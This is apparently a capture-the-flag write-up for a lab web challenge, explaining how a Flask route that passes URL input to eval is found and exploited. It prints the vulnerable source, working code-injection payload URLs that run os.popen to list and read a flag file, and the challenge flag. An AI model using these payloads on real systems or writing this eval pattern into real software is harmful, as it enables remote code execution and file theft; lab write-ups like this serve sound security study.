#### Challenge:

Hi, packet inspector,

the AI is preparing some kind of employee streamlining portal on [http://user-info.mysterious-delivery.tcc](http://user-info.mysterious-delivery.tcc). We fear this will lead to more lost packages.

Your task is to break into the web and find interesting information on the server.

May the Packet be with you!

`Note: Solving this challenge will open 1 new challenge.`

---

#### Solution:

We are presented with simple web application that prints back the last segment of the URL eg:

```text
http://user-info.mysterious-delivery.tcc/hello/user
```

prints:

```text
Hello user
```

Trying various inputs I noticed that inputting double quotes `"` causes the server to exit with `Internal Server Error (HTTP Status Code 500)`.
Based on that I tried:

```text
http://user-info.mysterious-delivery.tcc/hello/"+"a"+"
```

getting:

```text
Hello a
```

Noticing in the network tab the header `Server gunicorn`, I was pretty sure we are dealing with some kind of `python` injection/escape, hence I tried:

```text
http://user-info.mysterious-delivery.tcc/hello/"+str(open(__file__).read())+"
```

this got me the code of the application (manually formatted):

```python
from flask import Flask, Blueprint, redirect, render_template

bp = Blueprint("app", __name__)

def create_app():
    app = Flask(__name__)
    app.register_blueprint(bp, url_prefix="/")
    return app @bp.route('/hello/<path:userstring>')

def hello(userstring):
    message = eval('"Hello ' + userstring + '"')
    return render_template('index.html', message=message) @bp.route('/')

def redirect_to_user():
    return redirect("/hello/user", code=302)
```

With this knowledge I started building the payload for shell access.
Fast forward the tedious trial-and-error phase, I ended up with these commands for `directory listing` / `printing files`, which print the flag:

```text
http://user-info.mysterious-delivery.tcc/hello/"+str(__builtins__['__import__']('os').popen('ls -al /app/FLAG/flag.txt').read())+"
http://user-info.mysterious-delivery.tcc/hello/"+str(__builtins__['__import__']('os').popen('cat /app/FLAG/flag.txt').read())+"
```
---

<details><summary>FLAG:</summary>

```
FLAG{OONU-Pm7V-BK3s-YftK}
```

</details>
<br/>
